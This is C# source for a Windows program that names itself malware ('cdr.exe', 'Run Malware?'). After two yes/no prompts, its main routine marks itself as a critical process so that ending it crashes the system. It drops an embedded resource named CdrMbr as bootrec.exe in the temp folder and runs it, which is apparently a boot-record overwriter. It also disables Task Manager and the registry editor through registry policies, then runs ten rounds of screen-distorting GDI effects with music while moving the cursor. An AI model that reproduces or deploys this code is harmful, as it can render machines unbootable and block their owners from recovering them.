using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace cdr
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hDC);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            public int bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public abstract class Drawer
        {
            public bool running;
            public Random random = new Random();
            public int screenW = Screen.PrimaryScreen.Bounds.Width;
            public int screenH = Screen.PrimaryScreen.Bounds.Height;

            public void Start()
            {
                if (!running)
                {
                    running = true;
                    new Thread(DrawLoop).Start();
                }
            }

            public void Stop()
            {
                running = false;
            }

            private void DrawLoop()
            {
                while (running)
                {
                    IntPtr dC = GetDC(IntPtr.Zero);
                    if (dC != IntPtr.Zero)
                    {
                        Draw(dC);
                        ReleaseDC(IntPtr.Zero, dC);
                    }
                    Thread.Sleep(10);
                }
            }

            public abstract void Draw(IntPtr hdc);
        }
        private class Drawer1 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    redrawCounter += 5;
                    if (redrawCounter >= 360)
                    {
                        redrawCounter = 0;
                    }

                    byte r = 0, g = 0, b = 0;
                    float num = (float)redrawCounter / 360f;
                    float num2 = 0.5f * (1f + 1f);
                    float v = 2f * 0.5f - num2;

                    float vH1 = num + 1f / 3f;
                    if (vH1 < 0f) vH1++; if (vH1 > 1f) vH1--;
                    if (6f * vH1 < 1f) r = (byte)(255f * (v + (num2 - v) * 6f * vH1));
                    else if (2f * vH1 < 1f) r = (byte)(255f * num2);
                    else if (3f * vH1 < 2f) r = (byte)(255f * (v + (num2 - v) * (2f / 3f - vH1) * 6f));
                    else r = (byte)(255f * v);

                    float vH2 = num;
                    if (vH2 < 0f) vH2++; if (vH2 > 1f) vH2--;
                    if (6f * vH2 < 1f) g = (byte)(255f * (v + (num2 - v) * 6f * vH2));
                    else if (2f * vH2 < 1f) g = (byte)(255f * num2);
                    else if (3f * vH2 < 2f) g = (byte)(255f * (v + (num2 - v) * (2f / 3f - vH2) * 6f));
                    else g = (byte)(255f * v);

                    float vH3 = num - 1f / 3f;
                    if (vH3 < 0f) vH3++; if (vH3 > 1f) vH3--;
                    if (6f * vH3 < 1f) b = (byte)(255f * (v + (num2 - v) * 6f * vH3));
                    else if (2f * vH3 < 1f) b = (byte)(255f * num2);
                    else if (3f * vH3 < 2f) b = (byte)(255f * (v + (num2 - v) * (2f / 3f - vH3) * 6f));
                    else b = (byte)(255f * v);

                    using (Graphics graphics = Graphics.FromHdc(hdc))
                    {
                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(128, r, g, b)))
                        {
                            graphics.FillRectangle(brush, 0, 0, screenW, screenH);
                        }
                    }

                    int srcW = random.Next(100, 500);
                    int srcH = random.Next(100, 500);
                    int srcX = random.Next(0, screenW - srcW);
                    int srcY = random.Next(0, screenH - srcH);
                    int destX = random.Next(0, screenW - srcW);
                    int destY = random.Next(0, screenH - srcH);

                    StretchBlt(hdc, destX, destY, srcW, srcH, hdc, srcX, srcY, srcW, srcH, 0x00660046);
                }
                catch
                {
                }
                Thread.Sleep(10);
            }
        }
        public class Drawer2 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    redrawCounter++;
                    using (Graphics graphics = Graphics.FromHdc(hdc))
                    {
                        float hColor = (redrawCounter % 360) / 360f;
                        float q = 0.5f * (1f + 1f);
                        float p = 2f * 0.5f - q;

                        float tR = hColor + 1f / 3f;
                        float tG = hColor;
                        float tB = hColor - 1f / 3f;

                        if (tR < 0f) tR += 1f; if (tR > 1f) tR -= 1f;
                        if (tG < 0f) tG += 1f; if (tG > 1f) tG -= 1f;
                        if (tB < 0f) tB += 1f; if (tB > 1f) tB -= 1f;

                        byte r, g, b;

                        if ((6f * tR) < 1f) r = (byte)((p + (q - p) * 6f * tR) * 255f);
                        else if ((2f * tR) < 1f) r = (byte)(q * 255f);
                        else if ((3f * tR) < 2f) r = (byte)((p + (q - p) * (2f / 3f - tR) * 6f) * 255f);
                        else r = (byte)(p * 255f);

                        if ((6f * tG) < 1f) g = (byte)((p + (q - p) * 6f * tG) * 255f);
                        else if ((2f * tG) < 1f) g = (byte)(q * 255f);
                        else if ((3f * tG) < 2f) g = (byte)((p + (q - p) * (2f / 3f - tG) * 6f) * 255f);
                        else g = (byte)(p * 255f);

                        if ((6f * tB) < 1f) b = (byte)((p + (q - p) * 6f * tB) * 255f);
                        else if ((2f * tB) < 1f) b = (byte)(q * 255f);
                        else if ((3f * tB) < 2f) b = (byte)((p + (q - p) * (2f / 3f - tB) * 6f) * 255f);
                        else b = (byte)(p * 255f);

                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(random.Next(1, 255), r, g, b)))
                        {
                            Point point1 = new Point(random.Next(0, screenW), random.Next(0, screenH));
                            Point point2 = new Point(random.Next(0, screenW), random.Next(0, screenH));
                            Point point3 = new Point(random.Next(0, screenW), random.Next(0, screenH));
                            graphics.FillPolygon(brush, new Point[] { point1, point2, point3 });
                        }
                    }
                    if (redrawCounter >= 360)
                    {
                        redrawCounter = 0;
                    }
                }
                catch
                {
                }
            }
        }

        public class Drawer3 : Drawer
        {
            private int colorTimer;
            private float movementAngle;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    colorTimer += 2;
                    movementAngle += 0.05f;

                    if (colorTimer >= 360)
                    {
                        colorTimer = 0;
                    }

                    int waveOffset = (int)(Math.Sin(movementAngle) * 10.0);
                    StretchBlt(hdc, 0, 5, screenW, screenH, hdc, waveOffset, 0, screenW, screenH, 0x00CC0020);

                    using (Graphics gfx = Graphics.FromHdc(hdc))
                    {
                        float hColor = (colorTimer % 360) / 360f;
                        float q = 0.5f * (1f + 1f);
                        float p = 2f * 0.5f - q;

                        float tR = hColor + 1f / 3f;
                        float tG = hColor;
                        float tB = hColor - 1f / 3f;

                        if (tR < 0f) tR += 1f; if (tR > 1f) tR -= 1f;
                        if (tG < 0f) tG += 1f; if (tG > 1f) tG -= 1f;
                        if (tB < 0f) tB += 1f; if (tB > 1f) tB -= 1f;

                        byte r, g, b;

                        if ((6f * tR) < 1f) r = (byte)((p + (q - p) * 6f * tR) * 255f);
                        else if ((2f * tR) < 1f) r = (byte)(q * 255f);
                        else if ((3f * tR) < 2f) r = (byte)((p + (q - p) * (2f / 3f - tR) * 6f) * 255f);
                        else r = (byte)(p * 255f);

                        if ((6f * tG) < 1f) g = (byte)((p + (q - p) * 6f * tG) * 255f);
                        else if ((2f * tG) < 1f) g = (byte)(q * 255f);
                        else if ((3f * tG) < 2f) g = (byte)((p + (q - p) * (2f / 3f - tG) * 6f) * 255f);
                        else g = (byte)(p * 255f);

                        if ((6f * tB) < 1f) b = (byte)((p + (q - p) * 6f * tB) * 255f);
                        else if ((2f * tB) < 1f) b = (byte)(q * 255f);
                        else if ((3f * tB) < 2f) b = (byte)((p + (q - p) * (2f / 3f - tB) * 6f) * 255f);
                        else b = (byte)(p * 255f);

                        Color rainbowColor = Color.FromArgb(r, g, b);

                        int circleX = (int)(screenW / 2 + Math.Cos(movementAngle * 1.5) * (screenW / 4));
                        int circleY = (int)(screenH / 2 + Math.Sin(movementAngle * 2.0) * (screenH / 4));
                        int radius = 80;

                        using (SolidBrush fillBrush = new SolidBrush(Color.FromArgb(50, rainbowColor)))
                        {
                            gfx.FillEllipse(fillBrush, circleX - radius, circleY - radius, radius * 2, radius * 2);
                        }
                        using (Pen contourPen = new Pen(rainbowColor, 1f))
                        {
                            gfx.DrawEllipse(contourPen, circleX - radius, circleY - radius, radius * 2, radius * 2);
                        }
                    }
                }
                catch
                {
                }
            }
        }
        public class Drawer4 : Drawer
        {
            private int redrawCounter;
            private float rotationAngle;
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    int sx = screenW;
                    int s = redrawCounter;
                    for (int i = 0; i < sx; i += 200)
                    {
                        StretchBlt(hdc, i, s, 200, 200, hdc, i - 5, s - 5, 210, 210, 0x00CC0020);
                    }
                    redrawCounter += 200;
                    if (redrawCounter >= screenH)
                    {
                        redrawCounter = 0;
                    }
                    rotationAngle += 0.08f;
                    int size = random.Next(60, 250);
                    int centerX = screenW / 2;
                    int centerY = screenH / 2;
                    int radius = random.Next(100, Math.Min(screenW, screenH) / 3);
                    int x = (int)(centerX + Math.Cos(rotationAngle) * radius) - (size / 2);
                    int y = (int)(centerY + Math.Sin(rotationAngle) * radius) - (size / 2);
                    if (x < 0) x = 0;
                    if (y < 0) y = 0;
                    if (x + size > screenW) x = screenW - size;
                    if (y + size > screenH) y = screenH - size;
                    PatBlt(hdc, x, y, size, size, 0x005A0049);
                }
                catch
                {
                }
            }
        }
        public class Drawer5 : Drawer
        {
            private float jellyTime;
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    jellyTime += 0.1f;
                    IntPtr hdcMem = CreateCompatibleDC(hdc);
                    IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(hdcMem, hBitmap);
                    StretchBlt(hdcMem, 0, 0, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 0x00CC0020);
                    StretchBlt(hdcMem, screenW / 2, 0, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 0x00CC0020);
                    StretchBlt(hdcMem, 0, screenH / 2, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 0x00CC0020);
                    StretchBlt(hdcMem, screenW / 2, screenH / 2, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 0x00CC0020);
                    int size = random.Next(40, 200);
                    int px = random.Next(0, screenW - size);
                    int py = random.Next(0, screenH - size);
                    PatBlt(hdcMem, px, py, size, size, 0x005A0049);
                    for (int i = 0; i < screenW; i += 2)
                    {
                        int offsetH = (int)(Math.Sin(jellyTime + (i * 0.01f)) * 15.0);
                        StretchBlt(hdc, i, offsetH, 2, screenH, hdcMem, i, 0, 2, screenH, 0x00CC0020);
                    }
                    for (int i = 0; i < screenH; i += 2)
                    {
                        int offsetV = (int)(Math.Cos(jellyTime + (i * 0.01f)) * 15.0);
                        StretchBlt(hdc, offsetV, i, screenW, 2, hdc, 0, i, screenW, 2, 0x00CC0020);
                    }
                    DeleteObject(hBitmap);
                    DeleteDC(hdcMem);
                }
                catch
                {
                }
            }
        }
        public class Drawer6 : Drawer
        {
            private int redrawCounter;
            private float rotationAngle;
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    int sx = screenW;
                    int s = redrawCounter;
                    for (int i = 0; i < sx; i += 200)
                    {
                        StretchBlt(hdc, i, s, 200, 200, hdc, i - 5, s - 5, 210, 210, 0x00CC0020);
                    }
                    redrawCounter += 200;
                    if (redrawCounter >= screenH)
                    {
                        redrawCounter = 0;
                    }
                    rotationAngle += 0.08f;
                    int size = random.Next(60, 250);
                    int centerX = screenW / 2;
                    int centerY = screenH / 2;
                    int radius = random.Next(100, Math.Min(screenW, screenH) / 3);
                    int xPos = (int)(centerX + Math.Cos(rotationAngle) * radius) - (size / 2);
                    int yPos = (int)(centerY + Math.Sin(rotationAngle) * radius) - (size / 2);
                    if (xPos < 0) xPos = 0;
                    if (yPos < 0) yPos = 0;
                    if (xPos + size > screenW) xPos = screenW - size;
                    if (yPos + size > screenH) yPos = screenH - size;
                    PatBlt(hdc, xPos, yPos, size, size, 0x005A0049);
                    Process[] processes = Process.GetProcesses();
                    foreach (Process process in processes)
                    {
                        IntPtr mainWindowHandle = process.MainWindowHandle;
                        if (mainWindowHandle != IntPtr.Zero)
                        {
                            RECT lpRect;
                            if (GetWindowRect(GetForegroundWindow(), out lpRect))
                            {
                                int winW = lpRect.Right - lpRect.Left;
                                int winH = lpRect.Bottom - lpRect.Top;
                                if (winW > 0 && winH > 0)
                                {
                                    int nXOriginDest = random.Next(-screenW, screenW * 2);
                                    int nYOriginDest = random.Next(-screenH, screenH * 2);
                                    IntPtr solidBrush = CreateSolidBrush((uint)random.Next(0, 16777216));
                                    IntPtr oldBrush = SelectObject(hdc, solidBrush);
                                    PatBlt(hdc, lpRect.Left, lpRect.Top, winW, winH, 0x005A0049);
                                    SelectObject(hdc, oldBrush);
                                    DeleteObject(solidBrush);
                                    StretchBlt(hdc, nXOriginDest, nYOriginDest, winW - 10, winH - 10, hdc, lpRect.Left, lpRect.Top, winW, winH, 0x00660046);
                                }
                            }
                            Thread.Sleep(10);
                        }
                    }
                }
                catch
                {
                }
            }
            [DllImport("gdi32.dll")]
            private static extern IntPtr CreateSolidBrush(uint crColor);
        }
        public class Drawer7 : Drawer
        {
            private int redrawCounter;
            public override void Draw(IntPtr hdc)
            {
                float num = 0f;
                float num2 = 0f;
                float num3 = 20f;
                for (float num4 = 0f; num4 < 10f; num4 += 0.1f)
                {
                    float num5 = (float)Math.Sin(num4);
                    redrawCounter += 10;
                    int num6 = redrawCounter;
                    int nXDest = (int)(num * num3 + num2);
                    StretchBlt(hdc, nXDest, num6, screenW, 10, hdc, 0, num6, screenW, 10, 0x00CC0020);
                    if (redrawCounter >= screenH)
                    {
                        redrawCounter = 0;
                        RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    }
                    num = num5;
                }
                Thread.Sleep(10);
            }
        }
        public class Drawer8 : Drawer
        {
            private int redrawCounter1;
            private int redrawCounter2;
            public override void Draw(IntPtr hdc)
            {
                int sx = screenW;
                int s = redrawCounter1;
                for (int i = 0; i < sx; i += 200)
                {
                    StretchBlt(hdc, i, s, 200, 200, hdc, i - 5, s - 5, 210, 210, 0x00CC0020);
                }
                redrawCounter1 += 200;
                if (redrawCounter1 >= screenH)
                {
                    redrawCounter1 = 0;
                }
                float num = 0f;
                float num2 = 0f;
                float num3 = 20f;
                for (float num4 = 0f; num4 < 10f; num4 += 0.1f)
                {
                    float num5 = (float)Math.Sin(num4);
                    redrawCounter2 += 10;
                    int num6 = redrawCounter2;
                    int nXDest = (int)(num * num3 + num2);
                    StretchBlt(hdc, nXDest, num6, screenW, 10, hdc, 0, num6, screenW, 10, 0x00CC0020);
                    if (redrawCounter2 >= screenH)
                    {
                        redrawCounter2 = 0;
                        RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    }
                    num = num5;
                }
                Thread.Sleep(10);
            }
        }
        public class Drawer9 : Drawer
        {
            private float circleAngle;
            private IntPtr hdcMem;
            private IntPtr hBmp;
            private IntPtr bitsPtr;
            private int byteSize;
            public Drawer9()
            {
                byteSize = screenW * screenH * 4;
                IntPtr hdcScreen = GetDC(IntPtr.Zero);
                hdcMem = CreateCompatibleDC(hdcScreen);
                BITMAPINFO bmpi = new BITMAPINFO();
                bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
                bmpi.bmiHeader.biWidth = screenW;
                bmpi.bmiHeader.biHeight = screenH;
                bmpi.bmiHeader.biPlanes = 1;
                bmpi.bmiHeader.biBitCount = 32;
                bmpi.bmiHeader.biCompression = 0;
                hBmp = CreateDIBSection(hdcScreen, ref bmpi, 0, out bitsPtr, IntPtr.Zero, 0);
                SelectObject(hdcMem, hBmp);
                ReleaseDC(IntPtr.Zero, hdcScreen);
            }
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    BitBlt(hdcMem, 0, 0, screenW, screenH, hdc, 0, 0, 0x00CC0020);
                    byte[] buffer = new byte[byteSize];
                    Marshal.Copy(bitsPtr, buffer, 0, byteSize);
                    for (int i = 0; i < screenW * screenH; i++)
                    {
                        int index = i * 4;
                        byte b = buffer[index];
                        byte g = buffer[index + 1];
                        byte r = buffer[index + 2];
                        int rNew = (r * 2) % 256;
                        int gNew = (g * 2) % 256;
                        int bNew = (b * 2) % 256;
                        buffer[index] = (byte)bNew;
                        buffer[index + 1] = (byte)gNew;
                        buffer[index + 2] = (byte)rNew;
                    }
                    Marshal.Copy(buffer, 0, bitsPtr, byteSize);
                    BitBlt(hdc, 0, 0, screenW, screenH, hdcMem, 0, 0, 0x00CC0020);
                    circleAngle += 0.05f;
                    using (Graphics gfx = Graphics.FromHdc(hdc))
                    {
                        int cR = random.Next(0, 256);
                        int cG = random.Next(0, 256);
                        int cB = random.Next(0, 256);
                        Color rainbowColor = Color.FromArgb(cR, cG, cB);
                        int circleX = (int)(screenW / 2 + Math.Cos(circleAngle * 1.5) * (screenW / 4));
                        int circleY = (int)(screenH / 2 + Math.Sin(circleAngle * 2.0) * (screenH / 4));
                        int radius = 80;
                        using (SolidBrush fillBrush = new SolidBrush(Color.FromArgb(50, rainbowColor)))
                        {
                            gfx.FillEllipse(fillBrush, circleX - radius, circleY - radius, radius * 2, radius * 2);
                        }
                        using (Pen contourPen = new Pen(rainbowColor, 1f))
                        {
                            gfx.DrawEllipse(contourPen, circleX - radius, circleY - radius, radius * 2, radius * 2);
                        }
                    }
                }
                catch
                {
                }
            }
        }
        public class Drawer10 : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    int srcX = random.Next(0, screenW - 100);
                    int srcY = random.Next(0, screenH - 100);
                    int srcW = random.Next(100, 400);
                    int srcH = random.Next(100, 400);
                    int destX = random.Next(0, screenW - 100);
                    int destY = random.Next(0, screenH - 100);
                    int destW = random.Next(10, srcW / 2);
                    int destH = random.Next(10, srcH / 2);
                    StretchBlt(hdc, destX, destY, destW, destH, hdc, srcX, srcY, srcW, srcH, 0x00990066);
                    Thread.Sleep(300);
                }
                catch
                {
                }
            }
        }
        private class cur : Drawer
        {
            private int redrawCounter;
            private int codcod;
            private int ballWidth = 1;
            private int ballHeight = 1;
            private int ballPosX = Cursor.Position.X;
            private int ballPosY = Cursor.Position.Y;
            private int moveStepX = 1;
            private int moveStepY = 1;
            public override void Draw(IntPtr hdc)
            {
                Random r = new Random();
                int x = screenW;
                int y = screenH;
                Cursor.Position = new Point(ballPosX, ballPosY);
                ballPosX += moveStepX;
                if (ballPosX < 0 || ballPosX + ballWidth > screenW)
                {
                    moveStepX = -moveStepX;
                }
                ballPosY += moveStepY;
                if (ballPosY < 0 || ballPosY + ballHeight > screenH)
                {
                    moveStepY = -moveStepY;
                }
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Thread workflowThread = new Thread(RunWorkflow);
            workflowThread.IsBackground = true;
            workflowThread.Start();
            Application.Run();
        }

        public static int BreakOnTermination = 0x1D;
        public static int isCritical = 1;

        private static void RunWorkflow()
        {
            if (MessageBox.Show("Run Malware?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                if (MessageBox.Show("Are you sure?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
                {
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    string path = Path.Combine(Path.GetTempPath(), "bootrec.exe");
                    File.WriteAllBytes(path, cdr.Properties.Resources.CdrMbr);
                    Process.Start(path);

                    RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

                    Drawer d1 = new Drawer1();
                    Drawer d2 = new Drawer2();
                    Drawer d3 = new Drawer3();
                    Drawer d4 = new Drawer4();
                    Drawer d5 = new Drawer5();
                    Drawer d6 = new Drawer6();
                    Drawer d7 = new Drawer7();
                    Drawer d8 = new Drawer8();
                    Drawer d9 = new Drawer9();
                    Drawer d10 = new Drawer10();
                    Drawer cur = new cur();

                    SoundPlayer js1 = new SoundPlayer(cdr.Properties.Resources.track__1_);
                    SoundPlayer js2 = new SoundPlayer(cdr.Properties.Resources.track__2_);
                    SoundPlayer js3 = new SoundPlayer(cdr.Properties.Resources.track__3_);
                    SoundPlayer js4 = new SoundPlayer(cdr.Properties.Resources.track__4_);
                    SoundPlayer js5 = new SoundPlayer(cdr.Properties.Resources.track__5_);
                    SoundPlayer js6 = new SoundPlayer(cdr.Properties.Resources.track__6_);
                    SoundPlayer js7 = new SoundPlayer(cdr.Properties.Resources.track__7_);
                    SoundPlayer js8 = new SoundPlayer(cdr.Properties.Resources.track__8_);
                    SoundPlayer js9 = new SoundPlayer(cdr.Properties.Resources.track__9_);
                    SoundPlayer js10 = new SoundPlayer(cdr.Properties.Resources.track__10_);

                    Thread.Sleep(5000);

                    cur.Start();
                    d1.Start();
                    js1.Play();
                    Thread.Sleep(30000);
                    d1.Stop();
                    js1.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d2.Start();
                    js2.Play();
                    Thread.Sleep(30000);
                    d2.Stop();
                    js2.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d3.Start();
                    js3.Play();
                    Thread.Sleep(30000);
                    d3.Stop();
                    js3.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d4.Start();
                    js4.Play();
                    Thread.Sleep(30000);
                    d4.Stop();
                    js4.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d5.Start();
                    js5.Play();
                    Thread.Sleep(30000);
                    d5.Stop();
                    js5.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d6.Start();
                    js6.Play();
                    Thread.Sleep(30000);
                    d6.Stop();
                    js6.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d7.Start();
                    js7.Play();
                    Thread.Sleep(30000);
                    d7.Stop();
                    js7.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d8.Start();
                    js8.Play();
                    Thread.Sleep(30000);
                    d8.Stop();
                    js8.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d9.Start();
                    js9.Play();
                    Thread.Sleep(30000);
                    d9.Stop();
                    js9.Stop();

                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x85);
                    d10.Start();
                    js10.Play();
                    Thread.Sleep(30000);
                    d10.Stop();
                    js10.Stop();

                    cur.Stop();
                    Environment.Exit(0);
                }
            }
        }
    }
}